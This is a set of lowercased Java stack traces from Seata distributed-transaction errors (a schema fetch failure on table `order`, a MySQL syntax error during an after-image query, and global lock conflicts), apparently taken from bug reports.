java.sql.sqlexception: failed to fetch schema of `order` at io.seata.rm.datasource.sql.struct.tablemetacache.fetchschemeindefaultway(tablemetacache.java:142) at io.seata.rm.datasource.sql.struct.tablemetacache.fetchschema(tablemetacache.java:120) at io.seata.rm.datasource.sql.struct.tablemetacache.lambda$gettablemeta$0(tablemetacache.java:75) at com.github.benmanes.caffeine.cache.boundedlocalcache.lambda$docomputeifabsent$14(boundedlocalcache.java:2337) at java.util.concurrent.concurrenthashmap.compute(concurrenthashmap.java:1853) at com.github.benmanes.caffeine.cache.boundedlocalcache.docomputeifabsent(boundedlocalcache.java:2335) at com.github.benmanes.caffeine.cache.boundedlocalcache.computeifabsent(boundedlocalcache.java:2318) at com.github.benmanes.caffeine.cache.localcache.computeifabsent(localcache.java:111) at com.github.benmanes.caffeine.cache.localmanualcache.get(localmanualcache.java:54) at io.seata.rm.datasource.sql.struct.tablemetacache.gettablemeta(tablemetacache.java:73) at io.seata.rm.datasource.exec.basetransactionalexecutor.gettablemeta(basetransactionalexecutor.java:194) at io.seata.rm.datasource.exec.basetransactionalexecutor.gettablemeta(basetransactionalexecutor.java:178) at io.seata.rm.datasource.exec.insertexecutor.beforeimage(insertexecutor.java:70) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:72) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:60) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:96) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:54) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.apache.ibatis.logging.jdbc.preparedstatementlogger.invoke(preparedstatementlogger.java:59) at com.sun.proxy.$proxy33.execute(unknown source) at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:45) at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:73) at org.apache.ibatis.executor.simpleexecutor.doupdate(simpleexecutor.java:49) at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:115) at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:75) at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:170) at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:157) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:408) at com.sun.proxy.$proxy23.insert(unknown source) at org.mybatis.spring.sqlsessiontemplate.insert(sqlsessiontemplate.java:254) at org.apache.ibatis.binding.mappermethod.execute(mappermethod.java:52) at org.apache.ibatis.binding.mapperproxy.invoke(mapperproxy.java:53) at com.sun.proxy.$proxy29.insert(unknown source) at org.xue2shou.api.imp.orderserviceimp.inserorder(orderserviceimp.java:330) at org.xue2shou.api.imp.orderserviceimp.insertv1(orderserviceimp.java:170) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:333) at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:190) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:157) at org.springframework.transaction.interceptor.transactioninterceptor$1.proceedwithinvocation(transactioninterceptor.java:99) at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:282) at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:96) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:179) at org.springframework.aop.interceptor.exposeinvocationinterceptor.invoke(exposeinvocationinterceptor.java:92) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:179) at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:104) at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:64) at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:101) at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:76) at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:179) at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:213) at com.sun.proxy.$proxy21.insertv1(unknown source) at org.apache.dubbo.common.bytecode.wrapper19.invokemethod(wrapper19.java) at org.apache.dubbo.rpc.proxy.javassist.javassistproxyfactory$1.doinvoke(javassistproxyfactory.java:47) at org.apache.dubbo.rpc.proxy.abstractproxyinvoker.invoke(abstractproxyinvoker.java:86) at org.apache.dubbo.config.invoker.delegateprovidermetadatainvoker.invoke(delegateprovidermetadatainvoker.java:56) at org.apache.dubbo.rpc.protocol.invokerwrapper.invoke(invokerwrapper.java:56) at io.seata.integration.dubbo.transactionpropagationfilter.invoke(transactionpropagationfilter.java:60) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:63) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:88) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:54) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:80) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:79) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:137) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.filter.echofilter.invoke(echofilter.java:39) at org.apache.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:73) at org.apache.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:128) at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:103) at org.apache.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:200) at org.apache.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) at org.apache.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617) at java.lang.thread.run(thread.java:745)
caused by: io.seata.common.exception.shouldneverhappenexception: could not found any index in the table: `order` at io.seata.rm.datasource.sql.struct.tablemetacache.resultsetmetatoschema(tablemetacache.java:285) at io.seata.rm.datasource.sql.struct.tablemetacache.fetchschemeindefaultway(tablemetacache.java:137) ..
94 more ```
db 6 uid lobal lock wait timout ``` ```
java.sql.sqlsyntaxerrorexception: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near 'in='aa65ac42-4fcc-4412-a256-108841dd21f1'' at line 1
at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:536) ~[mysql-connector-java-6.0.6.jar:6.0.6] at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:513) ~[mysql-connector-java-6.0.6.jar:6.0.6] at com.mysql.cj.jdbc.exceptions.sqlexceptionsmapping.translateexception(sqlexceptionsmapping.java:115) ~[mysql-connector-java-6.0.6.jar:6.0.6] at com.mysql.cj.jdbc.connectionimpl.execsql(connectionimpl.java:1983) ~[mysql-connector-java-6.0.6.jar:6.0.6] at com.mysql.cj.jdbc.preparedstatement.executeinternal(preparedstatement.java:1826) ~[mysql-connector-java-6.0.6.jar:6.0.6] at com.mysql.cj.jdbc.preparedstatement.executequery(preparedstatement.java:1923) ~[mysql-connector-java-6.0.6.jar:6.0.6] at com.alibaba.druid.pool.druidpooledpreparedstatement.executequery(druidpooledpreparedstatement.java:228) ~[druid-1.1.10.jar:1.1.10] at io.seata.rm.datasource.exec.basetransactionalexecutor.buildtablerecords(basetransactionalexecutor.java:340) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.insertexecutor.afterimage(insertexecutor.java:80) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:74) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.lambda$executeautocommittrue$0(abstractdmlbaseexecutor.java:91) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.connectionproxy$lockretrypolicy.doretryonlockconflict(connectionproxy.java:290) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor$lockretrypolicy.execute(abstractdmlbaseexecutor.java:133) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:90) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:58) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:96) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.rm.datasource.preparedstatementproxy.executeupdate(preparedstatementproxy.java:74) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at org.springframework.jdbc.core.jdbctemplate.lambda$update$0(jdbctemplate.java:866) ~[spring-jdbc-5.1.9.release.jar:5.1.9.release] at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:616) ~[spring-jdbc-5.1.9.release.jar:5.1.9.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:861) ~[spring-jdbc-5.1.9.release.jar:5.1.9.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:916) ~[spring-jdbc-5.1.9.release.jar:5.1.9.release] at org.springframework.jdbc.core.jdbctemplate.update(jdbctemplate.java:926) ~[spring-jdbc-5.1.9.release.jar:5.1.9.release] at org.xxz.test.service.testservice.test8(testservice.java:97) ~[classes/:na] at org.xxz.test.service.testservice$$fastclassbyspringcglib$$f101794c.invoke(<generated>) ~[classes/:na] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.1.9.release.jar:5.1.9.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:749) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:104) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:64) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:101) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:76) ~[seata-all-0.8.1-snapshot.jar:0.8.1-snapshot] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at org.xxz.test.service.testservice$$enhancerbyspringcglib$$6e14b166.test8(<generated>) ~[classes/:na] at org.xxz.test.controller.testcontroller.test8(testcontroller.java:63) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_211] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_211] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_211] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_211] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:104) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:892) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1039) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1005) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:897) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:882) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) ~[tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:490) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:853) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1587) [tomcat-embed-core-9.0.22.jar:9.0.22] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.22.jar:9.0.22] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_211] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_211] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.22.jar:9.0.22] at java.lang.thread.run(thread.java:748) [na:1.8.0_211]
2019-09-12 14:22:25.829 error[serverhandlerthread_4_500]io.seata.server.lock.abstractlockmanager.islockable:118 -islockable error, xid:null, resourceid:jdbc:mysql://localhost:3306/seata, lockkey:t_account:1
java.lang.illegalargumentexception: branchsession can be null for memory/file locker
at io.seata.server.lock.lockerfactory.get(lockerfactory.java:96) at io.seata.server.lock.defaultlockmanager.getlocker(defaultlockmanager.java:144) at io.seata.server.lock.defaultlockmanager.getlocker(defaultlockmanager.java:134) at io.seata.server.lock.defaultlockmanager.islockable(defaultlockmanager.java:116) at io.seata.server.coordinator.defaultcore.lockquery(defaultcore.java:116) at io.seata.server.coordinator.defaultcoordinator.dolockcheck(defaultcoordinator.java:208) at io.seata.server.abstracttcinboundhandler$6.execute(abstracttcinboundhandler.java:196) at io.seata.server.abstracttcinboundhandler$6.execute(abstracttcinboundhandler.java:192) at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117) at io.seata.server.abstracttcinboundhandler.handle(abstracttcinboundhandler.java:192) at io.seata.core.protocol.transaction.globallockqueryrequest.handle(globallockqueryrequest.java:35) at io.seata.server.coordinator.defaultcoordinator.onrequest(defaultcoordinator.java:478) at io.seata.core.rpc.defaultservermessagelistenerimpl.ontrxmessage(defaultservermessagelistenerimpl.java:87) at io.seata.core.rpc.netty.rpcserver.dispatch(rpcserver.java:266) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:745) ```
bug1-rm or bug2-rm log:
### error committing transaction
cause: io.seata.rm.datasource.exec.lockconflictexception
### cause: io.seata.rm.datasource.exec.lockconflictexception
; uncategorized sqlexception; sql state [null]; error code [0]; null; nested exception is io.seata.rm.datasource.exec.lockconflictexception] with root cause io.seata.rm.datasource.exec.lockconflictexception: null at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:108) ~[seata-all-0.8.0.jar:0.8.0] at io.seata.rm.datasource.connectionproxy.processlocalcommitwithgloballocks(connectionproxy.java:171) ~[seata-all-0.8.0.jar:0.8.0] at io.seata.rm.datasource.connectionproxy.commit(connectionproxy.java:163) ~[seata-all-0.8.0.jar:0.8.0] at org.apache.ibatis.transaction.jdbc.jdbctransaction.commit(jdbctransaction.java:72) ~[mybatis-3.4.6.jar:3.4.6] at org.apache.ibatis.executor.baseexecutor.commit(baseexecutor.java:244) ~[mybatis-3.4.6.jar:3.4.6] at org.apache.ibatis.executor.cachingexecutor.commit(cachingexecutor.java:119) ~[mybatis-3.4.6.jar:3.4.6] at org.apache.ibatis.session.defaults.defaultsqlsession.commit(defaultsqlsession.java:224) ~[mybatis-3.4.6.jar:3.4.6] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:437) ~[mybatis-spring-1.3.2.jar:1.3.2] at com.sun.proxy.$proxy85.update(unknown source) ~[na:na] at org.mybatis.spring.sqlsessiontemplate.update(sqlsessiontemplate.java:294) ~[mybatis-spring-1.3.2.jar:1.3.2] at org.apache.ibatis.binding.mappermethod.execute(mappermethod.java:63) ~[mybatis-3.4.6.jar:3.4.6] at org.apache.ibatis.binding.mapperproxy.invoke(mapperproxy.java:59) ~[mybatis-3.4.6.jar:3.4.6] at com.sun.proxy.$proxy86.testgloballock(unknown source) ~[na:na] at io.seata.samples.integration.account.service.taccountserviceimpl.testgloballock(taccountserviceimpl.java:42) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_112] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_112] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_112] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_112] at org.springframework.aop.support.aoputils.invokejoinpointusingreflection(aoputils.java:343) ~[spring-aop-5.0.8.release.jar:5.0.8.release] at org.springframework.aop.framework.reflectivemethodinvocation.invokejoinpoint(reflectivemethodinvocation.java:197) ~[spring-aop-5.0.8.release.jar:5.0.8.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.0.8.release.jar:5.0.8.release] at io.seata.spring.annotation.globaltransactionalinterceptor.lambda$handlegloballock$0(globaltransactionalinterceptor.java:87) ~[seata-all-0.8.0.jar:0.8.0] at io.seata.rm.globallocktemplate.execute(globallocktemplate.java:46) ~[seata-all-0.8.0.jar:0.8.0] at io.seata.spring.annotation.globaltransactionalinterceptor.handlegloballock(globaltransactionalinterceptor.java:85) ~[seata-all-0.8.0.jar:0.8.0] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:78) ~[seata-all-0.8.0.jar:0.8.0] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:185) ~[spring-aop-5.0.8.release.jar:5.0.8.release] at org.springframework.aop.framework.jdkdynamicaopproxy.invoke(jdkdynamicaopproxy.java:212) ~[spring-aop-5.0.8.release.jar:5.0.8.release] at com.sun.proxy.$proxy89.testgloballock(unknown source) ~[na:na] at io.seata.samples.integration.account.controller.taccountcontroller.testgloballock(taccountcontroller.java:43) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_112] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_112] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_112] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_112] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:209) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:136) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:891) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:991) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:925) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:981) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:873) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at javax.servlet.http.httpservlet.service(httpservlet.java:635) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:858) ~[spring-webmvc-5.0.12.release.jar:5.0.12.release] at javax.servlet.http.httpservlet.service(httpservlet.java:742) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:52) ~[tomcat-embed-websocket-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.0.12.release.jar:5.0.12.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-8.5.37.jar:8.5.37] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) 